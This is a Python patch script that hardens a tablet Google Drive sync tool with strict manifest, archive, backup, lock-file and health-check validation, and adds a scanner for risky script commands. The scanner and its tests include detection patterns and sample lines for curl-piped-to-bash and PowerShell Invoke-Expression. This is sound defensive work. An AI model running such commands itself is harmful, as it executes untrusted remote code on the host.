#!/usr/bin/env python3
from __future__ import annotations

from pathlib import Path
import re

ROOT = Path(__file__).resolve().parents[2]


def read(name: str) -> str:
    return (ROOT / name).read_text(encoding="utf-8")


def write(name: str, text: str) -> None:
    (ROOT / name).write_text(text, encoding="utf-8")


def replace_once(text: str, old: str, new: str, label: str) -> str:
    count = text.count(old)
    if count != 1:
        raise RuntimeError(f"{label}: expected exactly one match, got {count}")
    return text.replace(old, new, 1)


def replace_function(text: str, name: str, replacement: str) -> str:
    pattern = re.compile(rf"^def {re.escape(name)}\([^\n]*\).*?(?=^def |\Z)", re.M | re.S)
    matches = list(pattern.finditer(text))
    if len(matches) != 1:
        raise RuntimeError(f"function {name}: expected one match, got {len(matches)}")
    match = matches[0]
    return text[:match.start()] + replacement.rstrip() + "\n\n" + text[match.end():]


def patch_core() -> None:
    path = "tablet_gdrive_sync.py"
    text = read(path)
    constants_old = 'MAX_FILE_SIZE = 20_000_000\nMAX_BUNDLE_SIZE = 200_000_000\nMANIFEST_RE = re.compile(r"^manifest_\\d{8}T\\d{6}Z_[A-Za-z0-9._-]+\\.json$")\n'
    constants_new = '''MAX_FILE_SIZE = 20_000_000
MAX_BUNDLE_SIZE = 200_000_000
MAX_MANIFEST_SIZE = 2_000_000
MAX_HEALTH_BYTES = 64 * 1024
EXPECTED_HEALTH_SERVICE = "TCG v109 Updater"
EXPECTED_V135_RUNTIME_ID = "tcg-updater-v135-verified-learning"
MANIFEST_RE = re.compile(r"^manifest_\\d{8}T\\d{6}Z_[A-Za-z0-9._-]+\\.json$")


def _reject_nonstandard_json(value: str) -> None:
    raise ValueError(f"non-standard JSON number blocked: {value}")


def _unique_json_object(pairs):
    result = {}
    for key, value in pairs:
        if key in result:
            raise ValueError(f"duplicate JSON key blocked: {key}")
        result[key] = value
    return result


def strict_json_loads(raw):
    try:
        if isinstance(raw, bytes):
            raw = raw.decode("utf-8")
        return json.loads(
            raw,
            parse_constant=_reject_nonstandard_json,
            object_pairs_hook=_unique_json_object,
        )
    except RecursionError as exc:
        raise ValueError("JSON nesting is too deep") from exc
'''
    text = replace_once(text, constants_old, constants_new, "core constants")

    text = replace_function(text, "atomic_write_json", '''def atomic_write_json(path: Path, data: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    tmp = path.with_name(f".{path.name}.tmp.{os.getpid()}")
    tmp.write_text(
        json.dumps(data, ensure_ascii=False, indent=2, allow_nan=False) + "\\n",
        encoding="utf-8",
    )
    os.replace(tmp, path)''')

    text = replace_function(text, "load_manifest", '''def load_manifest(path: Path) -> dict:
    raw = path.read_bytes()
    if len(raw) > MAX_MANIFEST_SIZE:
        raise ValueError("manifest too large")
    data = strict_json_loads(raw)
    if not isinstance(data, dict):
        raise ValueError("manifest must be a JSON object")
    if data.get("schema_version") != SCHEMA:
        raise ValueError("manifest schema mismatch")
    if data.get("repository") != REPO:
        raise ValueError("manifest repository mismatch")
    if data.get("source") != "chatgpt_automation":
        raise ValueError("manifest source mismatch")
    run_id = data.get("run_id")
    if not isinstance(run_id, str) or not re.fullmatch(r"[A-Za-z0-9._-]{8,120}", run_id):
        raise ValueError("invalid run_id")
    created_at = data.get("created_at")
    if not isinstance(created_at, str):
        raise ValueError("missing created_at")
    stamp = dt.datetime.fromisoformat(created_at.replace("Z", "+00:00"))
    if stamp.tzinfo is None or stamp.utcoffset() is None:
        raise ValueError("manifest timestamp must include a timezone")
    age = (dt.datetime.now(dt.timezone.utc) - stamp.astimezone(dt.timezone.utc)).total_seconds()
    if age < -600:
        raise ValueError("manifest timestamp is in the future")
    if age > 7 * 24 * 3600:
        raise ValueError("manifest is stale (>7 days)")
    main_sha = data.get("main_sha")
    if not isinstance(main_sha, str) or not re.fullmatch(r"[0-9a-f]{40}", main_sha):
        raise ValueError("invalid main_sha")
    bundle = data.get("bundle") or {}
    if not isinstance(bundle, dict):
        raise ValueError("invalid bundle metadata")
    bundle_name = bundle.get("name")
    bundle_hash = bundle.get("sha256")
    bundle_size = bundle.get("size")
    expected_bundle = rf"TCG_VERIFIED_\\d{{8}}T\\d{{6}}Z_{re.escape(run_id)}\\.tar\\.gz"
    if not isinstance(bundle_name, str) or not re.fullmatch(expected_bundle, bundle_name):
        raise ValueError("invalid bundle name")
    if not isinstance(bundle_hash, str) or not re.fullmatch(r"[0-9a-f]{64}", bundle_hash):
        raise ValueError("invalid bundle sha256")
    if type(bundle_size) is not int or bundle_size <= 0 or bundle_size > MAX_BUNDLE_SIZE:
        raise ValueError("invalid bundle size")
    files = data.get("files")
    if not isinstance(files, list):
        raise ValueError("missing files list")
    names = [item.get("name") if isinstance(item, dict) else None for item in files]
    if set(names) != set(OUTPUTS) or len(names) != len(OUTPUTS):
        raise ValueError("manifest must contain the exact 17 public JSON outputs")
    for item in files:
        name = item["name"]
        if name not in OUTPUTS:
            raise ValueError(f"unexpected file: {name}")
        digest = item.get("sha256")
        size = item.get("size")
        if not isinstance(digest, str) or not re.fullmatch(r"[0-9a-f]{64}", digest):
            raise ValueError(f"bad sha256 for {name}")
        if type(size) is not int or size < 0 or size > MAX_FILE_SIZE:
            raise ValueError(f"bad size for {name}")
    return data''')

    text = replace_function(text, "extract_bundle", '''def extract_bundle(bundle_path: Path, stage: Path, manifest: dict) -> None:
    expected = {item["name"]: item for item in manifest["files"]}
    with tarfile.open(bundle_path, "r:gz") as tf:
        file_members = []
        for member in tf:
            if len(file_members) >= len(OUTPUTS):
                raise ValueError("bundle contains extra archive entries")
            if not member.isreg():
                raise ValueError("bundle contains directory/link/device/non-regular entry")
            name = Path(member.name).name
            if member.name != name or name not in OUTPUTS:
                raise ValueError(f"unsafe/unexpected archive entry: {member.name}")
            if member.size < 0 or member.size > MAX_FILE_SIZE:
                raise ValueError(f"oversized archive entry: {name}")
            file_members.append(member)
        names = [Path(member.name).name for member in file_members]
        if set(names) != set(OUTPUTS) or len(names) != len(OUTPUTS):
            raise ValueError("bundle must contain exact 17 outputs")
        for member in file_members:
            name = Path(member.name).name
            target = stage / name
            src = tf.extractfile(member)
            if src is None:
                raise ValueError(f"cannot extract {name}")
            with target.open("wb") as out:
                shutil.copyfileobj(src, out, length=1024 * 1024)
            item = expected[name]
            if target.stat().st_size != item["size"]:
                raise ValueError(f"size mismatch: {name}")
            if sha256(target) != item["sha256"]:
                raise ValueError(f"sha mismatch: {name}")
            payload = strict_json_loads(target.read_bytes())
            if not isinstance(payload, (dict, list)):
                raise ValueError(f"JSON root must be object/array: {name}")''')

    text = replace_function(text, "health_ok", '''def _read_health_json(path: str, timeout: float = 2.0) -> dict | None:
    if path not in {"/api/v135-health", "/api/health"}:
        return None
    try:
        request = urllib.request.Request(
            f"http://127.0.0.1:8765{path}",
            headers={"Accept": "application/json", "Connection": "close"},
        )
        with urllib.request.urlopen(request, timeout=max(0.25, min(5.0, float(timeout)))) as resp:
            if not (200 <= int(getattr(resp, "status", 200)) < 300):
                return None
            raw = resp.read(MAX_HEALTH_BYTES + 1)
        if len(raw) > MAX_HEALTH_BYTES:
            return None
        payload = strict_json_loads(raw)
        return payload if isinstance(payload, dict) else None
    except (OSError, ValueError, TypeError, UnicodeError, json.JSONDecodeError):
        return None


def _health_identity_ok(path: str, payload: dict | None) -> bool:
    if not isinstance(payload, dict) or payload.get("ok") is not True:
        return False
    if path == "/api/v135-health":
        return payload.get("runtime") == EXPECTED_V135_RUNTIME_ID
    if path == "/api/health":
        return payload.get("service") == EXPECTED_HEALTH_SERVICE
    return False


def health_ok() -> bool:
    for path in ("/api/v135-health", "/api/health"):
        if _health_identity_ok(path, _read_health_json(path)):
            return True
    return False


def runtime_matches_main(expected_sha: str) -> bool:
    if not isinstance(expected_sha, str) or not re.fullmatch(r"[0-9a-f]{40}", expected_sha):
        return False
    for path in ("/api/v135-health", "/api/health"):
        payload = _read_health_json(path)
        if not _health_identity_ok(path, payload):
            continue
        collection = payload.get("collection_health")
        if not isinstance(collection, dict):
            continue
        running_sha = str(collection.get("runtime_build_sha") or "").strip().lower()
        if running_sha == expected_sha and collection.get("runtime_build_sha_verified") is True:
            return True
    return False''')

    text = replace_once(
        text,
        '            manifest = load_manifest(manifest_path)\n            manifest["_manifest_name"] = manifest_name\n',
        '            manifest = load_manifest(manifest_path)\n            manifest["_manifest_name"] = manifest_name\n            expected_manifest = rf"manifest_\\d{{8}}T\\d{{6}}Z_{re.escape(manifest[\'run_id\'])}\\.json"\n            if not re.fullmatch(expected_manifest, manifest_name):\n                raise ValueError("manifest filename/run_id mismatch")\n',
        "manifest filename binding",
    )
    text = replace_once(
        text,
        '                if not health_ok():\n                    raise RuntimeError("post-apply runtime health failed")\n',
        '                if not health_ok():\n                    raise RuntimeError("post-apply runtime health failed")\n                if not runtime_matches_main(manifest["main_sha"]):\n                    raise RuntimeError("post-apply runtime build SHA mismatch")\n',
        "post apply runtime binding",
    )
    text = replace_once(
        text,
        '{"runtime_health": True, "file_count": len(OUTPUTS)}',
        '{"runtime_health": True, "runtime_main_sha_verified": True, "file_count": len(OUTPUTS)}',
        "success receipt runtime binding",
    )
    write(path, text)


def patch_hardening() -> None:
    path = "tablet_gdrive_sync_hardening.py"
    text = read(path)
    text = replace_once(text, "import os\nfrom pathlib import Path\n", "import os\nfrom pathlib import Path\nimport re\n", "hardening re import")
    text = replace_once(text, "import subprocess\nimport sys\n", "import stat\nimport subprocess\nimport sys\n", "hardening stat import")

    text = replace_function(text, "acquire_runner_lock", '''def acquire_runner_lock(state: Path):
    if state.is_symlink():
        raise RuntimeError("sync state directory is a symlink")
    state.mkdir(parents=True, exist_ok=True)
    if state.is_symlink() or not state.is_dir():
        raise RuntimeError("sync state directory is unsafe")
    path = state / RUNNER_LOCK
    flags = os.O_RDWR | os.O_CREAT | os.O_APPEND | getattr(os, "O_NOFOLLOW", 0)
    try:
        descriptor = os.open(path, flags, 0o600)
    except OSError as exc:
        raise RuntimeError("runner lock open failed safely") from exc
    handle = None
    try:
        metadata = os.fstat(descriptor)
        if not stat.S_ISREG(metadata.st_mode) or metadata.st_nlink != 1:
            raise RuntimeError("runner lock is not a private regular file")
        try:
            os.fchmod(descriptor, 0o600)
        except OSError:
            pass
        handle = os.fdopen(descriptor, "r+", encoding="utf-8")
        descriptor = -1
        try:
            fcntl.flock(handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
        except BlockingIOError:
            handle.close()
            return None
        handle.seek(0)
        handle.truncate()
        handle.write(f"pid={os.getpid()} started_at={dt.datetime.now(dt.timezone.utc).isoformat()}\\n")
        handle.flush()
        try:
            os.fsync(handle.fileno())
        except OSError:
            pass
        return handle
    except BaseException:
        if handle is not None and not handle.closed:
            handle.close()
        elif descriptor >= 0:
            os.close(descriptor)
        raise''')

    text = replace_function(text, "verify_backup", '''def verify_backup(backup: Path) -> dict[str, str]:
    if backup.is_symlink() or not backup.is_dir():
        raise RuntimeError("backup directory is missing or unsafe")
    manifest_path = backup / "backup_manifest.json"
    if manifest_path.is_symlink() or not manifest_path.is_file():
        raise RuntimeError("backup manifest is missing or unsafe")
    raw = manifest_path.read_bytes()
    if len(raw) > 1_000_000:
        raise RuntimeError("backup manifest is too large")
    data = core.strict_json_loads(raw)
    if not isinstance(data, dict):
        raise RuntimeError("backup manifest must be an object")
    hashes = data.get("sha256")
    if not isinstance(hashes, dict) or set(hashes) != set(core.OUTPUTS):
        raise RuntimeError("backup manifest does not cover exact runtime outputs")
    trusted: dict[str, str] = {}
    for name in core.OUTPUTS:
        path = backup / name
        expected = hashes.get(name)
        if path.is_symlink() or not path.is_file():
            raise RuntimeError(f"backup file missing or unsafe: {name}")
        if not isinstance(expected, str) or not re.fullmatch(r"[0-9a-f]{64}", expected):
            raise RuntimeError(f"backup hash invalid: {name}")
        if core.sha256(path) != expected:
            raise RuntimeError(f"backup hash mismatch: {name}")
        trusted[name] = expected
    return trusted''')

    text = replace_function(text, "hardened_restore_backup", '''def hardened_restore_backup(repo: Path, backup: Path) -> None:
    hashes = verify_backup(backup)
    _ORIGINAL_RESTORE_BACKUP(repo, backup)
    for name in core.OUTPUTS:
        if core.sha256(repo / name) != hashes[name]:
            raise RuntimeError(f"rollback readback mismatch: {name}")''')

    text = replace_once(
        text,
        '    data = json.loads(marker.read_text(encoding="utf-8"))\n    marker_repo = Path(str(data.get("repo", ""))).expanduser().resolve()\n',
        '    raw = marker.read_bytes()\n    if len(raw) > 1_000_000:\n        raise RuntimeError("inflight transaction marker is too large")\n    data = core.strict_json_loads(raw)\n    if not isinstance(data, dict):\n        raise RuntimeError("inflight transaction marker must be an object")\n    marker_repo = Path(str(data.get("repo", ""))).expanduser().resolve()\n',
        "inflight strict parse",
    )
    write(path, text)


def patch_perf() -> None:
    path = "tablet_gdrive_sync_perf_v262.py"
    text = read(path)
    text = replace_function(text, "fast_health_ok", '''def fast_health_ok() -> bool:
    """Probe one bounded endpoint and verify the expected TCG service identity."""
    payload = core._read_health_json("/api/health", timeout=HEALTH_TIMEOUT_SECONDS)
    return bool(
        isinstance(payload, dict)
        and payload.get("ok") is True
        and payload.get("service") == core.EXPECTED_HEALTH_SERVICE
    )''')
    text = replace_function(text, "optimized_hardened_restore_backup", '''def optimized_hardened_restore_backup(repo: Path, backup: Path) -> None:
    """Verify once, restore once, and reuse the verified hash map."""
    hashes = hard.verify_backup(backup)
    hard._ORIGINAL_RESTORE_BACKUP(repo, backup)
    for name in core.OUTPUTS:
        if core.sha256(repo / name) != hashes[name]:
            raise RuntimeError(f"rollback readback mismatch: {name}")''')
    text = replace_once(
        text,
        '        data = json.loads(marker.read_text(encoding="utf-8"))\n        raw = data.get("backup")\n',
        '        payload = marker.read_bytes()\n        if len(payload) > 1_000_000:\n            return None\n        data = core.strict_json_loads(payload)\n        if not isinstance(data, dict):\n            return None\n        raw = data.get("backup")\n',
        "perf inflight strict parse",
    )
    write(path, text)


def patch_security_audit() -> None:
    path = "security_self_audit.py"
    text = read(path)
    text = replace_once(
        text,
        'TEXT_EXTENSIONS = {".py", ".js", ".html", ".yml", ".yaml", ".sh", ".bat", ".ps1"}',
        'TEXT_EXTENSIONS = {".py", ".js", ".html", ".yml", ".yaml", ".sh", ".bat", ".cmd", ".ps1"}',
        "script extension coverage",
    )
    marker = '\ndef _csp_directive(text: str, name: str) -> str:\n'
    scanner = r'''
def scan_script(text: str, findings: list[dict[str, Any]], rel: str) -> None:
    """Audit high-signal command-script execution boundaries without broad false positives."""
    suffix = Path(rel).suffix.lower()
    for lineno, line in enumerate(text.splitlines(), 1):
        if re.search(r"(?:curl|wget)\b[^\n|]*\|\s*(?:ba)?sh\b", line, re.I):
            add(findings, "SCRIPT_REMOTE_PIPE_SHELL", "critical", rel, lineno,
                "Remote content is piped directly to a shell.", line.strip())
        if suffix == ".ps1" and re.search(r"(?:\bInvoke-Expression\b|(?:^|[;&|\s])iex(?:[;&|\s(]|$))", line, re.I):
            add(findings, "POWERSHELL_DYNAMIC_EXEC", "high", rel, lineno,
                "PowerShell dynamic expression execution requires manual review.", line.strip())
        if suffix in {".bat", ".cmd"} and re.search(r"\bpowershell(?:\.exe)?\b.*(?:-enc|-encodedcommand)\b", line, re.I):
            add(findings, "BATCH_ENCODED_POWERSHELL", "high", rel, lineno,
                "Encoded PowerShell launched from batch/cmd requires manual review.", line.strip())

'''
    text = replace_once(text, marker, "\n" + scanner + "def _csp_directive(text: str, name: str) -> str:\n", "insert script scanner")
    dispatch_old = '''        if suffix in {".yml", ".yaml"} and "/workflows/" in f"/{rel}":
            scan_workflow(text, findings, rel)
        if suffix in {".js", ".html"}:
            scan_js_html(text, findings, rel)
'''
    dispatch_new = '''        if suffix in {".yml", ".yaml"} and "/workflows/" in f"/{rel}":
            scan_workflow(text, findings, rel)
        if suffix in {".sh", ".bat", ".cmd", ".ps1"}:
            scan_script(text, findings, rel)
        if suffix in {".js", ".html"}:
            scan_js_html(text, findings, rel)
'''
    text = replace_once(text, dispatch_old, dispatch_new, "script scanner dispatch")
    write(path, text)


def patch_tests() -> None:
    path = "test_tablet_gdrive_sync.py"
    text = read(path)
    root_marker = 'ROOT = Path(__file__).resolve().parent\n\n\nclass TabletGDriveSyncTests(unittest.TestCase):\n'
    response_helper = '''ROOT = Path(__file__).resolve().parent


class _Response:
    def __init__(self, body: bytes, status: int = 200):
        self._body = body
        self.status = status

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb):
        return False

    def read(self, limit=-1):
        return self._body if limit is None or limit < 0 else self._body[:limit]


class TabletGDriveSyncTests(unittest.TestCase):
'''
    text = replace_once(text, root_marker, response_helper, "gdrive response helper")
    insert_before = '\n    def test_installer_polls_exactly_every_12_hours(self):\n'
    added = r'''
    def test_manifest_json_is_strict_timezone_aware_and_bool_sizes_are_rejected(self):
        _, _, mp, manifest = self.build_fixture()
        raw = mp.read_text(encoding="utf-8")
        duplicate = raw[:-1] + ',"run_id":"duplicate01"}'
        mp.write_text(duplicate, encoding="utf-8")
        with self.assertRaises(ValueError):
            sync.load_manifest(mp)

        manifest["created_at"] = "2026-09-25T12:00:00"
        mp.write_text(json.dumps(manifest), encoding="utf-8")
        with self.assertRaises(ValueError):
            sync.load_manifest(mp)

        manifest["created_at"] = dt.datetime.now(dt.timezone.utc).isoformat()
        manifest["bundle"]["size"] = True
        mp.write_text(json.dumps(manifest), encoding="utf-8")
        with self.assertRaises(ValueError):
            sync.load_manifest(mp)

        manifest["bundle"]["size"] = 1
        manifest["files"][0]["size"] = True
        mp.write_text(json.dumps(manifest), encoding="utf-8")
        with self.assertRaises(ValueError):
            sync.load_manifest(mp)

        raw = json.dumps(manifest).replace('"size": true', '"size": NaN', 1)
        mp.write_text(raw, encoding="utf-8")
        with self.assertRaises(ValueError):
            sync.load_manifest(mp)

    def test_bundle_rejects_directory_entries_instead_of_ignoring_them(self):
        td, _, _, manifest = self.build_fixture()
        bundle = td / "TCG_VERIFIED_20260919T000000Z_testrun01.tar.gz"
        with tarfile.open(bundle, "w:gz") as tf:
            directory = tarfile.TarInfo("extra/")
            directory.type = tarfile.DIRTYPE
            tf.addfile(directory)
            for item in manifest["files"]:
                source = td / "src" / item["name"]
                tf.add(source, arcname=item["name"])
        stage = td / "strict-stage"
        stage.mkdir()
        with self.assertRaises(ValueError):
            sync.extract_bundle(bundle, stage, manifest)

    def test_runtime_health_requires_service_identity_and_exact_verified_main_sha(self):
        expected = "a" * 40
        body = json.dumps({
            "ok": True,
            "service": sync.EXPECTED_HEALTH_SERVICE,
            "collection_health": {
                "runtime_build_sha": expected,
                "runtime_build_sha_verified": True,
            },
        }).encode("utf-8")
        with mock.patch.object(sync.urllib.request, "urlopen", return_value=_Response(body)):
            self.assertTrue(sync.runtime_matches_main(expected))
        with mock.patch.object(sync.urllib.request, "urlopen", return_value=_Response(body)):
            self.assertFalse(sync.runtime_matches_main("b" * 40))
        with mock.patch.object(sync.urllib.request, "urlopen", return_value=_Response(b'{"ok":true}')):
            self.assertFalse(sync.health_ok())

    def test_runner_lock_symlink_is_rejected_without_touching_target(self):
        with tempfile.TemporaryDirectory() as tmp:
            state = Path(tmp) / "state"
            state.mkdir()
            victim = Path(tmp) / "victim.txt"
            victim.write_text("keep-me", encoding="utf-8")
            (state / hardening.RUNNER_LOCK).symlink_to(victim)
            with self.assertRaises(RuntimeError):
                hardening.acquire_runner_lock(state)
            self.assertEqual(victim.read_text(encoding="utf-8"), "keep-me")

    def test_backup_manifest_duplicate_keys_fail_closed(self):
        with tempfile.TemporaryDirectory() as tmp:
            backup = self.build_backup(Path(tmp))
            manifest = backup / "backup_manifest.json"
            good = json.loads(manifest.read_text(encoding="utf-8"))["sha256"]
            manifest.write_text(
                '{"sha256":' + json.dumps(good) + ',"sha256":' + json.dumps(good) + '}',
                encoding="utf-8",
            )
            with self.assertRaises(ValueError):
                hardening.verify_backup(backup)
'''
    text = replace_once(text, insert_before, "\n" + added + insert_before, "gdrive strict tests")
    write(path, text)

    path = "test_tablet_gdrive_sync_perf_v262.py"
    text = read(path)
    old_test = '''    def test_health_probe_is_single_bounded_universal_request(self):
        response = _Response(b'{"ok":true}')
        with mock.patch.object(perf.urllib.request, "urlopen", return_value=response) as urlopen:
            self.assertTrue(perf.fast_health_ok())
        self.assertEqual(urlopen.call_count, 1)
        request = urlopen.call_args.args[0]
        self.assertEqual(request.full_url, "http://127.0.0.1:8765/api/health")
        self.assertEqual(urlopen.call_args.kwargs["timeout"], perf.HEALTH_TIMEOUT_SECONDS)

        oversized = _Response(b"x" * (64 * 1024 + 1))
        with mock.patch.object(perf.urllib.request, "urlopen", return_value=oversized):
            self.assertFalse(perf.fast_health_ok())
        with mock.patch.object(perf.urllib.request, "urlopen", return_value=_Response(b'{"ok":false}')):
            self.assertFalse(perf.fast_health_ok())
'''
    new_test = '''    def test_health_probe_is_single_bounded_identity_checked_request(self):
        response = _Response(b'{"ok":true,"service":"TCG v109 Updater"}')
        with mock.patch.object(perf.urllib.request, "urlopen", return_value=response) as urlopen:
            self.assertTrue(perf.fast_health_ok())
        self.assertEqual(urlopen.call_count, 1)
        request = urlopen.call_args.args[0]
        self.assertEqual(request.full_url, "http://127.0.0.1:8765/api/health")
        self.assertEqual(urlopen.call_args.kwargs["timeout"], perf.HEALTH_TIMEOUT_SECONDS)

        oversized = _Response(b"x" * (64 * 1024 + 1))
        with mock.patch.object(perf.urllib.request, "urlopen", return_value=oversized):
            self.assertFalse(perf.fast_health_ok())
        with mock.patch.object(perf.urllib.request, "urlopen", return_value=_Response(b'{"ok":true}')):
            self.assertFalse(perf.fast_health_ok())
        with mock.patch.object(perf.urllib.request, "urlopen", return_value=_Response(b'{"ok":true,"service":"other"}')):
            self.assertFalse(perf.fast_health_ok())
'''
    text = replace_once(text, old_test, new_test, "perf health test")
    old_restore = '''            real_loads = json.loads
            with mock.patch.object(perf.hard, "verify_backup") as verify, \\
                 mock.patch.object(perf.hard, "_ORIGINAL_RESTORE_BACKUP") as restore, \\
                 mock.patch.object(perf.core, "sha256", return_value=digest), \\
                 mock.patch.object(perf.json, "loads", side_effect=real_loads) as loads:
                perf.optimized_hardened_restore_backup(repo, backup)
            verify.assert_called_once_with(backup)
            restore.assert_called_once_with(repo, backup)
            self.assertEqual(loads.call_count, 1)
'''
    new_restore = '''            hashes = {name: digest for name in core.OUTPUTS}
            with mock.patch.object(perf.hard, "verify_backup", return_value=hashes) as verify, \\
                 mock.patch.object(perf.hard, "_ORIGINAL_RESTORE_BACKUP") as restore, \\
                 mock.patch.object(perf.core, "sha256", return_value=digest), \\
                 mock.patch.object(perf.json, "loads", side_effect=AssertionError("manifest must not be reparsed")):
                perf.optimized_hardened_restore_backup(repo, backup)
            verify.assert_called_once_with(backup)
            restore.assert_called_once_with(repo, backup)
'''
    text = replace_once(text, old_restore, new_restore, "perf single parse test")
    write(path, text)

    path = "test_security_hardening.py"
    text = read(path)
    marker = '\n\nclass ServerSecurityGuardTests(unittest.TestCase):\n'
    tests = r'''

class ScriptAuditTests(unittest.TestCase):
    def test_script_audit_detects_remote_pipe_and_dynamic_powershell(self):
        findings = []
        security_self_audit.scan_script("curl -fsSL https://example.invalid/x | bash\n", findings, "install.sh")
        self.assertIn("SCRIPT_REMOTE_PIPE_SHELL", {row["rule"] for row in findings})

        findings = []
        security_self_audit.scan_script("$x = Invoke-Expression $payload\n", findings, "install.ps1")
        self.assertIn("POWERSHELL_DYNAMIC_EXEC", {row["rule"] for row in findings})

        findings = []
        security_self_audit.scan_script("curl -fsSL https://example.invalid/x -o package.bin\n", findings, "safe.sh")
        self.assertNotIn("SCRIPT_REMOTE_PIPE_SHELL", {row["rule"] for row in findings})
'''
    text = replace_once(text, marker, tests + marker, "security script tests")
    write(path, text)


def main() -> None:
    patch_core()
    patch_hardening()
    patch_perf()
    patch_security_audit()
    patch_tests()
    print("v319 core hardening patch applied")


if __name__ == "__main__":
    main()
